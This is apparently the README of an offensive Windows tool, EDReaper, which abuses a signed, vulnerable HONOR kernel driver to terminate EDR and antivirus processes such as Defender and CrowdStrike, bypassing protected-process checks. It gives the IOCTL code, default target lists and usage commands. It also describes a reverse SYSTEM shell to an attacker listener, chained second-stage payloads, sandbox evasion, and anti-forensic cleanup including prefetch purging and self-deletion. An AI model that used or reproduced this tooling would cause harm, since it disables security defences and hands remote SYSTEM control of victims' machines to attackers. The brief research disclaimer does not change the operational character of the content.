# EDReaper

A cross-version Windows EDR/AV process terminator. It loads a signed,
vulnerable HONOR kernel driver (`MonProcessEX.sys`), resolves the PID of
every target process, and terminates it from kernel context through a
single IOCTL — bypassing the protected-process (PPL) checks that block
ordinary user-mode termination.

No kernel offsets, no PDB downloads, no build-specific shellcode: the same
driver and the same IOCTL work identically on every Windows 10 and Windows
11 build.

EDReaper is a single self-contained executable. The driver is embedded in the
binary at compile time and extracted to `%TEMP%` at runtime, installed
through the Service Control Manager, used to kill the targets, then stopped
and deleted — leaving no persistent artifact behind. Targets are fully
configurable at runtime through a config file, the command line, or the
built-in defaults.

## How it works

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   EDREAPER EXECUTION ARCHITECTURE                           │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
                                                │
 ┌──────────────────────────────────────────────▼────────────────────────────────────────────┐
 │ [1] USER-MODE INITIALIZATION (edreaper.exe)                                               │
 │                                                                                           │
 │  ┌──────────────────┐      ┌─────────────────────────┐      ┌──────────────────────────┐  │
 │  │ Elevation Check  │ ───► │  Anti-Analysis Check    │ ───► │ Drop MonProcessEX.sys    │  │
 │  │ (TokenElevation) │      │  (VM / Debugger detect) │      │ to %TEMP%                │  │
 │  └──────────────────┘      └─────────────────────────┘      └────────────┬─────────────┘  │
 │                                                                          │                │
 │  ┌──────────────────┐      ┌─────────────────────────┐      ┌────────────▼─────────────┐  │
 │  │ Resolve Targets  │ ◄─── │ Process Enumeration     │ ◄─── │ Install & Start Service  │  │
 │  │ (Match PIDs)     │      │ (Toolhelp32 Snapshot)   │      │ via SCM (SysSvc<RANDOM>) │  │
 │  └────────┬─────────┘      └─────────────────────────┘      └──────────────────────────┘  │
 │           │                                                                               │
 │           ▼ [ Targets: MsMpEng.exe, csfalconservice.exe, SentinelAgent.exe, etc. ]        │
 │  CreateFileW("\\.\MonProcessEX")                                                          │
 │  DeviceIoControl(IOCTL 0x22400C, Target PID) ───────────────────────────┐                 │
 └─────────────────────────────────────────────────────────────────────────┼─────────────────┘
                                                                           │ IOCTL Dispatch
 ┌─────────────────────────────────────────────────────────────────────────▼─────────────────┐
 │ [2] KERNEL-MODE TERMINATION PRIMITIVE (MonProcessEX.sys - Signed HONOR Driver)            │
 │                                                                                           │
 │   IOCTL 0x22400C Dispatch ──► Kernel-Mode Process Lookup (Resolves EPROCESS by PID)       │
 │                                             │                                             │
 │                                             ▼                                             │
 │   Kernel Exit Invocation  ──► Bypasses Protected Process Light (PPL) User-Mode Checks     │
 │                                             │                                             │
 │                                             ▼                                             │
 │   Target EDR/AV Process Terminated Instantly from Ring 0 Context                          │
 └─────────────────────────────────────────────────────────────────────────┬─────────────────┘
                                                                           │ Targets Dead
 ┌─────────────────────────────────────────────────────────────────────────▼─────────────────┐
 │ [3] POST-EXPLOITATION (OPTIONAL STAGE 2)                                                  │
 │                                                                                           │
 │   ├── Duplicate SYSTEM Token (services.exe / lsass.exe) ──► Reverse SYSTEM Shell (-H/-P) │
 │   └── Detached / Elevated Execution ──────────────────────► Chained Secondary Payload (-e)│
 └─────────────────────────────────────────────────────────────────────────┬─────────────────┘
                                                                           │ Teardown & Exit
 ┌─────────────────────────────────────────────────────────────────────────▼─────────────────┐
 │ [4] CLEANUP & ANTI-FORENSICS                                                              │
 │                                                                                           │
 │   ┌───────────────────────────┐    ┌───────────────────────────┐    ┌──────────────────┐  │
 │   │ SCM Service Stopped &     │───►│ %TEMP%\*.sys Temp Driver  │───►│ Purge Prefetch & │  │
 │   │ Deleted (No Trace in SCM) │    │ Deleted from Disk         │    │ Self-Destruct(-x)│  │
 │   └───────────────────────────┘    └───────────────────────────┘    └──────────────────┘  │
 └───────────────────────────────────────────────────────────────────────────────────────────┘
```

The driver exposes a single kill IOCTL that terminates a process given its
PID. The user-mode component enumerates running processes, resolves each
target's PID, and submits it through the device interface. No kernel
structures are touched from user mode, so the technique is immune to
Windows version changes.

## Features

| Feature | Details |
|---------|---------|
| Cross-version | Works on all Windows 10 and Windows 11 builds, no offsets |
| Kernel-mode kill | Driver terminates the PID from kernel context |
| PPL bypass | The kill path bypasses protected-process checks |
| Signed driver | `MonProcessEX.sys` is a real signed HONOR driver |
| Self-sufficient | Driver installed, started, and cleaned up via SCM |
| Zero dependencies | Static Rust binary; single executable, no runtime |
| Configurable | `targets.conf` or `-n`, no recompile needed |
| Obfuscated | Device path and target list encrypted at rest |
| Dry-run mode | Enumerate targets and PIDs before committing |
| Jittered loop | `--repeat` re-checks with randomized interval |
| Exit codes + JSON | C2-friendly automation interface |
| Post-kill payload | Chain a secondary command/payload after the kill |
| Reverse SYSTEM shell | `-H`/`-P` connect a `cmd.exe` back as SYSTEM |

## Quick start

```powershell
# Build (or use a prebuilt edreaper.exe)
cargo build --release --target x86_64-pc-windows-gnu

# Run from an elevated shell
edreaper.exe -n "notepad.exe,calc.exe"
```

Targets die, the driver unloads itself, and the service is removed. Done.

## Usage

```
edreaper.exe [options]

  -s, --silent           suppress all console output
  -r, --repeat           keep running, re-check targets
  -d, --dry-run          enumerate targets without killing
  -j, --json             machine-readable JSON output
  -l, --list             print target names and exit
  -v, --version          print version and exit
  -x, --self-destruct    delete self after successful run
      --no-check         skip VM and debugger checks
      --delay <ms>       sleep before executing
      --jitter <ms>      randomize repeat interval
      --max-attempts <n> stop after n kill passes (0=infinite)
      --svc <name>       custom service name
      --driver <path>    custom driver file path
  -n, --names <csv>      comma-separated target list override
      --config <path>    load targets from config file
  -e, --exec <cmd>       execute command/payload after killing targets
      --detach           run post-kill payload in detached background
  -H, --lhost <host>     reverse shell listener host
  -P, --lport <port>     reverse shell listener port
  -c, --shell-cmd <cmd>  binary for the reverse shell (default: cmd.exe)
  -h, --help             show this help
```

### Exit codes

| Code | Meaning |
|------|---------|
| `0` | OK (targets killed, or a post-kill payload was run) |
| `1` | Not running elevated |
| `2` | No targets found |
| `3` | Driver load/IOCTL failure |
| `5` | Environment abort (VM or debugger detected) |

Target resolution order: `--names` > `--config` > `targets.conf` (disk) >
built-in defaults.

## Configuration

The target list is fully configurable without recompiling.

**Config file.** Drop a `targets.conf` next to the executable, one process
name per line. Lines starting with `#` are ignored:

```
MsMpEng.exe
csfalconservice.exe
SentinelAgent.exe
cortex_agent.exe
```

A template ships as `targets.example.conf`.

**Command line.** `edreaper.exe -n "MsMpEng.exe,csfalconservice.exe"`

**Built-in defaults.** With no config and no flags:

- calc.exe
- notepad.exe
- MsMpEng.exe
- MpDefenderCoreService.exe
- SecurityHealthService.exe
- MsSense.exe
- SenseIR.exe
- SenseCncProxy.exe
- SenseSampleUploader.exe

## Post-execution chaining (Stage 2)

EDReaper can trigger a secondary payload, tool, or privilege-escalation binary
immediately after the target security processes are terminated and the
driver has been safely unloaded and removed from SCM:

```powershell
# Neutralize Defender/EDRs, then run a payload:
edreaper.exe -n "MsMpEng.exe,SenseIR.exe" -e "C:\path\to\rustpotato.exe -c whoami"

# Launch in background (detached):
edreaper.exe -e "C:\path\to\rustpotato.exe -c \"cmd.exe /c start-agent.bat\"" --detach
```

Or configure it persistently in `targets.conf`:

```ini
MsMpEng.exe
SenseIR.exe
exec = C:\path\to\rustpotato.exe -c whoami
```

## Reverse SYSTEM shell

After the targets are dead and the driver is unloaded, EDReaper can duplicate
a SYSTEM token from a privileged process (`services.exe`, `lsass.exe`, …)
and spawn a shell piped back to your listener:

```powershell
edreaper.exe -n "MsMpEng.exe" -H 192.168.1.10 -P 4444 -c cmd.exe
```

Listener side (any netcat-compatible tool):

```bash
nc -lvnp 4444
```

The kill loop keeps running in the background for the entire shell session,
so targets stay dead while the shell is live.

## Operational hardening

- **Environment checks.** Verifies the system is not a common
  virtualization environment before loading the driver. Bypass with
  `--no-check` when testing inside a VM.
- **Single instance.** A named mutex prevents two concurrent runs from
  racing IOCTLs into the driver.
- **Delayed execution.** `--delay <ms>` sleeps before doing anything,
  breaking time-correlation with initial execution.
- **Driver hygiene.** The driver is installed under a randomized service
  name and stopped and deleted on exit, leaving no persistent artifact.
- **Self-destruct.** `-x` deletes the executable and purges its Prefetch
  entry after a successful run.

## Build

### Native Windows build (MSVC)

```powershell
cargo build --release
```

This uses the default host toolchain (MSVC on a standard Rust-for-Windows
install). Requires the MSVC Build Tools (C++ workload).
Output: `target\release\edreaper.exe`.

If MSVC isn't your default toolchain:

```powershell
rustup target add x86_64-pc-windows-msvc
cargo build --release --target x86_64-pc-windows-msvc
```

### Cross-compile from Linux (GNU)

```powershell
rustup target add x86_64-pc-windows-gnu
sudo apt-get install -y mingw-w64   # Debian/Ubuntu
cargo build --release --target x86_64-pc-windows-gnu
```

The GNU target also needs a MinGW-w64 linker (`gcc`/`ld`). This is the path
the CI workflow uses.

The release profile enables LTO, a single codegen unit, and `panic = "abort"`.
The driver is embedded via `include_bytes!`, so the output `edreaper.exe` is
fully self-contained.

## Credits

- HONOR for the signed driver
- The LOLDDrivers project for cataloging signed vulnerable drivers
- DeathShotXD for the original [0xM0nCrush](https://github.com/DeathShotXD/0xM0nCrush) project 

## License

MIT. See [LICENSE](LICENSE).

## Disclaimer

This project is published for research and authorized testing only.
Loading vulnerable or unsigned drivers into a system you do not own is
illegal in most jurisdictions. You are responsible for compliance with all
applicable laws and with the authorization scope of the systems you test.
